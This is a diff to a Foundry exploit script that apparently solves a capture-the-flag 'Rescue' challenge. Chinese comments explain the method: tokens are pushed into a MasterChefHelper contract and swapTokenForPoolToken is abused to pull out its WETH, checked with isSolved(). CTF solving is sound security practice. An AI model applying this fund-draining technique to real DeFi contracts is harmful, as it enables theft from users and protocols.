@@ -23,31 +23,30 @@ contract RescueScript is Script {
     IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
     IERC20 dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
     UniswapV2RouterLike public constant router = UniswapV2RouterLike(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
+    Setup setup;
 
-    //    function setUp() public {
-    //        vm.createSelectFork("cts");
-    //    }
+    function setUp() public {
+        vm.createSelectFork("eth");
+        setup = (new Setup){value: 10 ether}();
+    }
     // 思路
     // rescue work logic：swapTokenForPoolToken 会将自身的token1.balance 跟token2.balance进行addLiquidity
     // 1. 往mch里打入等同于10eth 的dai（此处11eth防止滑点，确保eth能全部拿出）
     // 2. 随便用个其它第三种币（usdc），call mch的swapTokenForPoolToken
     function run() public {
-        vm.startBroadcast();
-
-        Setup setup = Setup(0xbf067Ab6BDa1aE38696d1b372F5A8f2a56e92994);
         MasterChefHelper mch = setup.mcHelper();
-
         weth.deposit{value : 30 ether}();
         weth.approve(address(router), type(uint256).max);
 
-        swap(address(weth), address(dai), 11 * 1e18);
-        swap(address(weth), address(usdc), 1 * 1e18);
+        swap(address(weth), address(dai), 11 ether);
+        swap(address(weth), address(usdc), 1 ether);
+
         usdc.approve(address(mch), type(uint256).max);
-        uint daiBal = dai.balanceOf(address(msg.sender));
+        uint daiBal = dai.balanceOf(address(this));
         dai.transfer(address(mch), daiBal);
 
-        mch.swapTokenForPoolToken(2, address(usdc), usdc.balanceOf(msg.sender), 0);
-        console2.log(setup.isSolved());
+        mch.swapTokenForPoolToken(2, address(usdc), usdc.balanceOf(address(this)), 0);
+        console2.log("solved?", setup.isSolved());
     }
 
     function swap(address tokenIn, address tokenOut, uint256 amountIn) internal {
@@ -58,7 +57,7 @@ contract RescueScript is Script {
             amountIn,
             0,
             path,
-            address(msg.sender),
+            address(this),
             block.timestamp
         );
     }
